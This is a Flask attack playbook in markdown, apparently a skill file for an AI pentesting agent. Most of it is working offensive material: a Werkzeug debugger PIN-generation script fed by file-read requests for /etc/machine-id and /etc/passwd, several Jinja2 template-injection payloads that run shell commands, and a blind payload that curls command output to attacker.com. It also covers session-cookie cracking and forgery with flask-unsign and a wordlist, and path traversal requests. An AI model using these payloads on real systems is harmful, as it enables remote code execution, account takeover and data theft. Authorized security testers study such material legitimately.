<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: flask
description: Security testing playbook for Flask applications covering Werkzeug debugger RCE, SSTI via Jinja2, session forgery, misconfigurations, and Flask-specific attack patterns
---

# Flask Security Testing

Flask is a Python micro-framework — minimal by design, security depends entirely on developer choices. Critical attack surface: Werkzeug debugger RCE (PIN bypass), Jinja2 SSTI, secret key abuse for session forgery, and missing security defaults.

---

## Reconnaissance

### Fingerprinting Flask

    # Flask-specific headers and responses
    Server: Werkzeug/<version> Python/<version>   # Confirms Flask
    Content-Type: text/html; charset=utf-8

    # Common Flask framework paths
    GET /                         # Root
    GET /favicon.ico              # May reveal app name
    GET /_debug_toolbar/          # Flask Debug Toolbar
    GET /console                  # Werkzeug interactive console (DEV ONLY)
    GET /api/                     # REST API root (Flask-RESTX, Flask-RESTful)
    GET /api/swagger.json         # Swagger docs
    GET /api/docs                 # Swagger UI
    GET /swagger/                 # Flask-RESTX swagger
    GET /graphql                  # Graphene (Flask GraphQL)

    # 404 error reveals Werkzeug:
    GET /nonexistent → "404 Not Found: The requested URL was not found on the server"
    # Werkzeug debugger 500:
    GET /any-route-that-errors → Interactive Python debugger in browser

    # Exposed files
    GET /.env
    GET /config.py
    GET /settings.py
    GET /requirements.txt

---

## Werkzeug Debugger RCE

**CRITICAL** — If debug mode is on and the interactive console is accessible:

    # 1. Detect debug mode:
    GET /any-route-that-causes-exception
    # Look for: interactive debugger in response, "↑ click to expand" in error page

    # 2. Direct console access (old Werkzeug < 0.11):
    GET /console
    # Gives immediate Python REPL = instant RCE

    # 3. PIN bypass (Werkzeug 0.11+ with PIN protection):
    # The PIN is computed from: machine-id, MAC address, username, Python path, app module path
    # If SSRF or LFI exists, read the components:

    # Component 1: /etc/machine-id or /proc/sys/kernel/random/boot_id
    curl <target>/read?file=/etc/machine-id

    # Component 2: MAC address of network interface
    curl <target>/read?file=/sys/class/net/eth0/address
    # Convert to integer: int("00:11:22:33:44:55".replace(":",""), 16)

    # Component 3: /etc/passwd → find username running Flask
    curl <target>/read?file=/etc/passwd | grep www-data

    # Component 4: Python executable path
    curl <target>/read?file=/proc/<pid>/cmdline   # Flask process PID

    # Component 5: App module path (from error page source)

    # Generate PIN (Python):
    python3 -c "
    import hashlib, itertools
    from itertools import chain

    probably_public_bits = [
        'www-data',                              # username
        'flask.app',                             # modname
        'Flask',                                 # app class name
        '/usr/local/lib/python3.9/dist-packages/flask/app.py',  # app path
    ]
    private_bits = [
        '2485377892366',                         # MAC as int
        '<machine-id-content>',
    ]

    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit: continue
        if isinstance(bit, str): bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')

    cookie_name = '__wzd' + h.hexdigest()[:20]
    rv = None
    num = None
    if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]
    rv = '-'.join([num[x:x+3] for x in range(0, 9, 3)])
    print(f'PIN: {rv}')
    "

    # Use PIN to unlock console → Python REPL → RCE:
    # Enter PIN in browser debugger interface → Interactive console → exec('import os; os.system("id")')

---

## Jinja2 SSTI (Server-Side Template Injection)

Flask uses Jinja2 as its template engine:

    # Basic detection:
    {{7*7}}                 # Returns 49 → Jinja2 confirmed
    {{7*'7'}}               # Returns 7777777 → Jinja2 (vs 49 = Twig)
    ${7*7}                  # Returns ${7*7} → not Twig
    <%= 7*7 %>              # Returns <%= 7*7 %> → not ERB

    # Information gathering:
    {{config}}              # Dump Flask config (SECRET_KEY, SQLALCHEMY_DATABASE_URI, etc.)
    {{config.items()}}
    {{request}}             # Flask request object
    {{request.environ}}     # WSGI environment (server info)
    {{self.__dict__}}

    # RCE via Jinja2 sandbox bypass:
    # Method 1: MRO traversal (most common)
    {{''.__class__.__mro__[1].__subclasses__()}}   # List all subclasses

    # Find index of subprocess.Popen:
    {{''.__class__.__mro__[1].__subclasses__()[<idx>]('id', shell=True, stdout=-1).communicate()}}

    # Method 2: lipsum global
    {{lipsum.__globals__['os'].popen('id').read()}}

    # Method 3: request.application
    {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

    # Method 4: cycler
    {{cycler.__init__.__globals__.os.popen('id').read()}}

    # Method 5: joiner
    {{joiner.__init__.__globals__['os'].popen('id').read()}}

    # Method 6: namespace
    {{namespace.__init__.__globals__['os'].popen('id').read()}}

    # Blind SSTI (no output):
    {{''.__class__.__mro__[1].__subclasses__()[<idx>](['curl','http://attacker.com/?x='+__import__('os').popen('id').read()],stdout=-1)}}

    # Fuzz for SSTI injection points:
    # All GET/POST parameters, HTTP headers, URL path, cookie values, JSON fields

---

## Session Forgery (Flask SECRET_KEY)

Flask signs sessions with SECRET_KEY using itsdangerous:

    # Flask session cookie format: base64(<data>).base64(<timestamp>).<signature>
    # Decode session data:
    python3 -c "
    import base64, json, zlib
    cookie = '<flask_session_cookie_value>'
    payload = cookie.split('.')[0]
    # Pad base64
    payload += '=' * (4 - len(payload) % 4)
    data = base64.b64decode(payload.replace('-','+').replace('_','/'))
    try:
        print(json.loads(zlib.decompress(data[1:])))  # Compressed
    except:
        print(json.loads(data))
    "

    # Find SECRET_KEY (look in source, .env, git history, config.py)
    # Common weak keys:
    SECRET_KEY = 'secret'
    SECRET_KEY = 'dev'
    SECRET_KEY = 'development'
    SECRET_KEY = 'supersecret'
    SECRET_KEY = 'changeme'

    # Brute force SECRET_KEY with flask-unsign:
    pip install flask-unsign
    flask-unsign --unsign --cookie '<cookie>' --wordlist /usr/share/wordlists/rockyou.txt
    flask-unsign --unsign --cookie '<cookie>' --wordlist /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt

    # Forge session with known/cracked key:
    flask-unsign --sign --cookie "{'user_id': 1, 'role': 'admin', 'logged_in': True}" --secret 'secret'
    # Set the forged cookie → admin access

---

## SQL Injection (SQLAlchemy / SQLite)

Flask with SQLAlchemy ORM is parameterized, but raw text queries exist:

    # Vulnerable:
    db.engine.execute(f"SELECT * FROM users WHERE id={user_id}")
    User.query.filter(text(f"username = '{username}'"))

    # Safe:
    User.query.filter_by(username=username)
    db.execute("SELECT * FROM users WHERE id = :id", {"id": user_id})

    # Test: standard SQLi payloads on all input fields

---

## CSRF

Flask has no built-in CSRF protection — depends on Flask-WTF or manual implementation:

    # Check if CSRF is implemented:
    # Look for csrf_token in form source
    # Or check for X-CSRFToken / X-CSRF-Token header requirement

    # If no CSRF protection:
    # All state-changing POST requests are CSRF-vulnerable if cookies are used for auth

    # Flask-Login uses cookies → all POST routes without Flask-WTF are CSRF-vulnerable

---

## Common Flask Misconfigurations

    # Debug mode in production:
    app.run(debug=True)    # NEVER in production

    # Weak secret key:
    app.config['SECRET_KEY'] = 'dev'

    # All origins CORS (Flask-CORS):
    CORS(app)              # Equivalent to Access-Control-Allow-Origin: *
    CORS(app, resources={r"/api/*": {"origins": "*"}})

    # No HTTPS enforcement:
    # Missing Talisman or HSTS header

    # Direct host binding:
    app.run(host='0.0.0.0')    # Exposed to all interfaces

    # Unsafe deserialization (Pickle):
    import pickle
    data = pickle.loads(user_input)    # RCE if user controls input

---

## Path Traversal in Static Files

    # Flask serve static: /static/<filename>
    GET /static/../../../etc/passwd
    GET /static/..%2F..%2F..%2Fetc%2Fpasswd

    # Custom static directories may also be vulnerable:
    GET /uploads/../config.py

---

## Flask Extensions Attack Surface

    # Flask-Admin (admin dashboard):
    GET /admin/               # May be exposed without auth
    GET /admin/user/          # User management

    # Flask-DebugToolbar:
    GET /_debug_toolbar/static/

    # Flask-Login: check if remember_me cookie is signed properly

    # Flask-Babel: locale injection
    GET /endpoint?lang=../../../../etc/passwd%00

    # Flask-Uploads: check allowed extensions
    # Flask-Marshmallow: mass assignment via schema

---

## Pro Tips

1. Check `Server: Werkzeug` header — confirms Flask and version
2. `{{config}}` in SSTI dumps SECRET_KEY and database URLs directly
3. Werkzeug PIN bypass is complex but reliable if LFI exists to read `/etc/machine-id`
4. `flask-unsign` is the fastest tool for cracking Flask session cookies
5. `debug=True` in production = instant RCE via `/console` — test immediately
6. Flask has no CSRF protection by default — all cookie-based POST routes are vulnerable
7. SQLite database file path is often in config — try `GET /app.db` or `GET /database.db`

## Summary

Flask testing = check `Server: Werkzeug` + test SSTI with `{{7*7}}` on all inputs + decode/forge session cookie (flask-unsign) + probe `/console` for debug mode. SSTI in Flask/Jinja2 is direct RCE — `{{lipsum.__globals__['os'].popen('id').read()}}` is the most reliable payload. Session cookie forgery with weak/known SECRET_KEY is often easier than SSTI — always try `flask-unsign --wordlist` first.
